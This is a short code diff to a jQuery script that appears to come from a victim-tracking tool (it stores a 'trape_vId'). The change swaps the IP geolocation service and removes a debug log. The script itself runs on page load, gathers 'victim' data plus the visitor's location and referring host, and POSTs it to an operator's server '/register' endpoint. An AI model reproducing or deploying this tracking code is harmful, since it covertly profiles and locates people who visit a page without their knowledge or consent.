@@ -1,6 +1,6 @@
 $(document).ready(function($) {
 
-    $.getJSON('//ip-api.com/json', function(data) {
+    $.getJSON('https://api.ipgeolocation.io/ipgeo?apiKey=' + window.IpInfoApiKey, function(data) {
         var d = getVictimData();
 
         $.extend(true, d, data);
@@ -15,13 +15,12 @@ $(document).ready(function($) {
 
         d.refer = document.location.host;
 
-    	$.ajax({
+        $.ajax({
             url: window.serverPath + "/register",
             data: d,
             dataType: "json",
             type: "POST",
             success: function(response) {
-                console.log(response);
                 if (response.status == 'OK'){
                     localStorage.setItem("trape_vId", response.vId);
                     conChange();
